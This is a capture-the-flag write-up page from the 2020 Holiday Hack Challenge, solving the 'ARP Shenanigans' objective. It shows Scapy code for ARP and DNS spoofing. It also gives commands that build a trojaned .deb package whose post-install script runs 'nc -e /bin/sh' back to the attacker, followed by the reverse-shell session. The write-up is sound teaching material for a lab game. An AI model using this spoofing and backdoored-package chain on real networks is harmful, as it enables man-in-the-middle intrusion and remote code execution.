@@ -1,0 +1,949 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <meta name="author" content="Dan Roberts">
+      
+      
+      <link rel="shortcut icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.3">
+    
+    
+      
+        <title>9) ARP Shenanigans - 2020 Holiday Hack Challenge Solution</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.3b61ea93.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.39b8e14a.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ef5552">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Merriweather:300,400,400i,700%7C&display=fallback">
+        <style>body,input{font-family:"Merriweather",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="red" data-md-color-accent="green">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#objective-9-arp-shenanigans" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+  
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../index.html" title="2020 Holiday Hack Challenge Solution" class="md-header-nav__button md-logo" aria-label="2020 Holiday Hack Challenge Solution">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.5 1.25a.75.75 0 00-1.5 0v8.69L6.447 5.385a.75.75 0 10-1.061 1.06L9.94 11H1.25a.75.75 0 000 1.5h8.69l-4.554 4.553a.75.75 0 001.06 1.061L11 13.561v8.689a.75.75 0 001.5 0v-8.69l4.553 4.554a.75.75 0 001.061-1.06L13.561 12.5h8.689a.75.75 0 000-1.5h-8.69l4.554-4.553a.75.75 0 10-1.06-1.061L12.5 9.939V1.25z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            2020 Holiday Hack Challenge Solution
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              9) ARP Shenanigans
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../index.html" title="2020 Holiday Hack Challenge Solution" class="md-nav__button md-logo" aria-label="2020 Holiday Hack Challenge Solution">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.5 1.25a.75.75 0 00-1.5 0v8.69L6.447 5.385a.75.75 0 10-1.061 1.06L9.94 11H1.25a.75.75 0 000 1.5h8.69l-4.554 4.553a.75.75 0 001.06 1.061L11 13.561v8.689a.75.75 0 001.5 0v-8.69l4.553 4.554a.75.75 0 001.061-1.06L13.561 12.5h8.689a.75.75 0 000-1.5h-8.69l4.554-4.553a.75.75 0 10-1.06-1.061L12.5 9.939V1.25z"/></svg>
+
+    </a>
+    2020 Holiday Hack Challenge Solution
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../index.html" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      Objectives
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Objectives" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        Objectives
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="obj-01.html" class="md-nav__link">
+      1) Uncover Santa's Gift List
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="obj-02.html" class="md-nav__link">
+      2) Investigate S3 Bucket
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="obj-03.html" class="md-nav__link">
+      3) Point-of-Sale Password Recovery
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="obj-04.html" class="md-nav__link">
+      4) Operate the Santavator
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="obj-05.html" class="md-nav__link">
+      5) Open HID Lock
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="obj-06.html" class="md-nav__link">
+      6) Splunk Challenge
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="obj-07.html" class="md-nav__link">
+      7) Solve the Sleigh's CAN-D-BUS Problem
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="obj-08.html" class="md-nav__link">
+      8) Broken Tag Generator
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        9) ARP Shenanigans
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="obj-09.html" class="md-nav__link md-nav__link--active">
+      9) ARP Shenanigans
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#objective" class="md-nav__link">
+    Objective
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="obj-10.html" class="md-nav__link">
+      10) Defeat Fingerprint Sensor
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="obj-11a.html" class="md-nav__link">
+      11a) Naughty/Nice List with Blockchain Investigation Part 1
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="obj-11b.html" class="md-nav__link">
+      11b) Naughty/Nice List with Blockchain Investigation Part 2
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../ending.html" class="md-nav__link">
+      Ending
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" >
+    
+    <label class="md-nav__link" for="nav-4">
+      Terminals
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Terminals" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        <span class="md-nav__icon md-icon"></span>
+        Terminals
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/snowball.html" class="md-nav__link">
+      Snowball Fight
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/elfcode.html" class="md-nav__link">
+      The Elf Code
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/unprep.html" class="md-nav__link">
+      UnPrep
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/scapy.html" class="md-nav__link">
+      Scapy Prepper
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/kiosk.html" class="md-nav__link">
+      Kringle Kiosk
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/sortomatic.html" class="md-nav__link">
+      Sort-o-matic
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/linuxprimer.html" class="md-nav__link">
+      Linux Primer
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/unescapetmux.html" class="md-nav__link">
+      Unescape Tmux
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/canbus.html" class="md-nav__link">
+      CAN-Bus Investigation
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/redis.html" class="md-nav__link">
+      Redis Bug Hunt
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/336kbps.html" class="md-nav__link">
+      33.6kbps
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../eggs.html" class="md-nav__link">
+      Easter Eggs
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#objective" class="md-nav__link">
+    Objective
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="objective-9-arp-shenanigans">Objective #9 - ARP Shenanigans</h1>
+<h2 id="objective">Objective</h2>
+<p>Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?</p>
+<figure>
+  <img src="img/obj-09-intro.png">
+</figure>
+
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>If you need help, read the HELP.md file in the terminal for additional hints.</p>
+</div>
+<h2 id="solution">Solution</h2>
+<p><strong>Step 1:</strong> Capture some packets and notice that there are unanswered ARP requests coming from the remote host.</p>
+<div class="codehilite"><pre><span></span><code>$ tshark  -ni eth0
+Capturing on &#39;eth0&#39;
+<span class="hll">    1 0.000000000 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+</span></code></pre></div>
+
+<p><strong>Step 2:</strong> Modify arp_rest.py to create a spoofed reply to the ARP request.  The following lines need to be modified in the script.</p>
+<div class="codehilite"><pre><span></span><code>ether_resp = Ether(dst=&quot;4c:24:57:ab:ed:84&quot;, type=0x806, src=&quot;02:42:0a:06:00:02&quot;)
+
+arp_response = ARP(pdst=&quot;4c:24:57:ab:ed:84&quot;)
+arp_response.op = 2
+arp_response.plen = 4
+arp_response.hwlen = 6
+arp_response.ptype = 0x0800
+arp_response.hwtype = 1
+
+arp_response.hwsrc = &quot;02:42:0a:06:00:02&quot;
+arp_response.psrc = &quot;10.6.6.53&quot;
+arp_response.hwdst = &quot;4c:24:57:ab:ed:84&quot;
+arp_response.pdst = &quot;10.6.6.35&quot;
+</code></pre></div>
+
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Your terminal may use slightly different values for IP address and MAC address.  Be sure to check the output of ifconfig to see what values to use for the local host.</p>
+</div>
+<p><strong>Step 3:</strong> Observe the DNS request once the ARP reply is correct.</p>
+<div class="codehilite"><pre><span></span><code>$ tshark  -ni eth0
+Capturing on &#39;eth0&#39;
+   9 8.295979549 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+   10 8.320179378 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
+<span class="hll">   11 8.336321657    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
+</span></code></pre></div>
+
+<p><strong>Step 4:</strong> Modify dns_resp.py to create a spoofed reply to the DNS request.  The following lines need to be modified in the script.  When you run this, you’ll see in the tshark output that a request is being made to port 80 on your host.</p>
+<div class="codehilite"><pre><span></span><code>ipaddr_we_arp_spoofed = &quot;10.6.6.53&quot;
+
+def handle_dns_request(packet):
+    eth = Ether(src=&quot;02:42:0a:06:00:02&quot;, dst=&quot;4c:24:57:ab:ed:84&quot;)
+    ip  = IP(dst=&quot;10.6.6.35&quot;, src=&quot;10.6.6.53&quot;) 
+    udp = UDP(dport=packet[UDP].sport, sport=53)
+    dns = DNS(
+        id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=ipaddr)
+</code></pre></div>
+
+<p><strong>Step 5:</strong> Set up an http listener to answer the port 80 connection.  You'll see that the client is requesting a .deb file. </p>
+<div class="codehilite"><pre><span></span><code>$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) …
+10.6.6.35 - - [14/Dec/2020 03:14:41] code 404, message File not found
+<span class="hll">10.6.6.35 - - [14/Dec/2020 03:14:41] &quot;GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1&quot; 404 -
+</span></code></pre></div>
+
+<p><strong>Step 6:</strong> Create a deb file to exploit the remote host.  A .deb file is a debian software package.  A post-installation script can be embedded in the file to run commands necessary to complete the package setup.  You'll find a netcat deb package in the debs folder on the terminal.  You can rename this to the deb package being requested by the remote host, and modify it to run a netcat command after it is installed.</p>
+<div class="codehilite"><pre><span></span><code>fakeroot sh -c &#39;
+   mkdir tmp
+   dpkg-deb -R debs/netcat-traditional_1.10–41.1ubuntu1_amd64.deb tmp
+   echo &quot;nc -e /bin/sh 10.6.0.2 5678&quot; &gt;&gt; tmp/DEBIAN/postinst
+   dpkg-deb -b tmp fixed.deb
+&#39;
+</code></pre></div>
+
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>fakeroot runs a command in an environment where it appears to have root privileges for file manipulation. This is useful for allowing users to create archives (tar, ar, .deb etc.) with files in them with root permissions/ownership. <i>-From https://wiki.debian.org/FakeRoot</i></p>
+</div>
+<p><strong>Step 7</strong>: Put it all together</p>
+<p>Tmux pane #1 contains the DNS spoof responder and the HTTP listener.</p>
+<div class="codehilite"><pre><span></span><code>$ mkdir -p http/pub/jfrost/backdoor
+$ mv fixed.deb http/pub/jfrost/backdoor/suriv_amd64.deb
+$ scripts/dns_resp.py &amp;&amp; python3 -m http.server 80 --directory http/
+</code></pre></div>
+
+<p>TMUX pane #3 contains the netcat listener to catch the reverse shell.</p>
+<div class="codehilite"><pre><span></span><code>$ nc -nlvp 5678
+</code></pre></div>
+
+<p>Tmux pane #2 contains the ARP spoof responder.</p>
+<div class="codehilite"><pre><span></span><code>$ scripts/arp_resp.py
+</code></pre></div>
+
+<p><strong>Step 8:</strong> When the reverse shell is established, view the target file.</p>
+<div class="codehilite"><pre><span></span><code>$ nc -nlvp 5678
+listening on [any] 5678
+connect to [10.6.0.2] from (UNKNOWN) [10.6.6.35] 35976
+id
+uid=1500(jfrost) gid=1500(jfrost) groups=1500(jfrost)
+cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
+NORTH POLE
+LAND USE BOARD
+MEETING MINUTES
+
+January 20, 2020
+
+Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole
+
+Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time.
+
+Roll call of Board members please:
+Chairman Jack Frost - Present
+Vice Chairman Mother Nature - Present
+
+Superman - Present
+Clarice - Present
+Yukon Cornelius - HERE!
+Ginger Breaddie - Present
+King Moonracer - Present
+Mrs. Donner - Present
+Tanta Kringle - Present
+Charlie In-the-Box - Here
+Krampus - Growl
+Dolly - Present
+Snow Miser - Heya!
+Alabaster Snowball - Hello
+Queen of the Winter Spirits - Present
+
+ALSO PRESENT:
+                Kris Kringle
+                Pepper Minstix
+                Heat Miser
+                Father Time
+
+Chairman Frost made the required announcement concerning the Open Public Meetings Act: 
+Adequate notice of this meeting has been made -- displayed on the bulletin board next to the 
+Pole, listed on the North Pole community website, and published in the North Pole Times 
+newspaper -- for people who are interested in this meeting.
+
+Review minutes for December 2020 meeting. Motion to accept – Mrs. Donner. Second – Superman.  
+Minutes approved.
+
+OLD BUSINESS: No Old Business.
+
+RESOLUTIONS:
+The board took up final discussions of the plans presented last year for the expansion of 
+Santa’s Castle to include new courtyard, additional floors, elevator, roughly tripling the 
+size of the current castle.  Architect Ms. Pepper reviewed the planned changes and 
+engineering reports. Chairman Frost noted, “These changes will put a heavy toll on the 
+infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already been 
+expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic 
+will be a burden on local residents.”  Dolly explained traffic projections were all in 
+alignment with existing roadways.  Chairman Frost then exclaimed, “But with all the attention 
+focused on Santa and his castle, how will people ever come to refer to the North Pole as ‘The 
+Frostiest Place on Earth?’”  Mr. In-the-Box pointed out that new tourist-friendly taglines 
+are always under consideration by the North Pole Chamber of Commerce, and are not a matter 
+<span class="hll">for this Board.  Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  Tanta 
+</span><span class="hll">Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in 
+</span><span class="hll">his life.  
+</span>
+Approved:
+Mother Nature
+Superman
+Clarice
+Yukon Cornelius
+Ginger Breaddie
+King Moonracer
+Mrs. Donner
+Charlie In the Box
+Krampus
+Dolly
+Snow Miser
+Alabaster Snowball
+Queen of the Winter Spirits
+
+Opposed: 
+                Jack Frost
+
+Resolution carries.  Construction approved.
+
+NEW BUSINESS:
+
+Father Time Castle, new oversized furnace to be installed by Heat Miser Furnace, Inc.  Mr. H. 
+Miser described the plan for installing new furnace to replace the faltering one in Mr. 
+Time’s 20,000 sq ft castle. Ms. G. Breaddie pointed out that the proposed new furnace is 
+900,000,000 BTUs, a figure she considers “incredibly high for a building that size, likely 
+two orders of magnitude too high.  Why, it might burn the whole North Pole down!”  Mr. H. 
+Miser replied with a laugh, “That’s the whole point!”  The board voted unanimously to reject 
+the initial proposal, recommending that Mr. Miser devise a more realistic and safe plan for 
+Mr. Time’s castle heating system.
+
+
+Motion to adjourn – So moved, Krampus.  Second – Clarice. All in favor – aye. None opposed, 
+although Chairman Frost made another note of his strong disagreement with the approval of the 
+Kringle Castle expansion plan.  Meeting adjourned.
+</code></pre></div>
+
+<p><strong><em>Answer: Tanta Kringle</em></strong></p>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="obj-08.html" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                8) Broken Tag Generator
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="obj-10.html" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                10) Defeat Fingerprint Sensor
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../assets/javascripts/vendor.08c56446.min.js"></script>
+      <script src="../assets/javascripts/bundle.6ced434e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "..",
+          features: [],
+          search: Object.assign({
+            worker: "../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
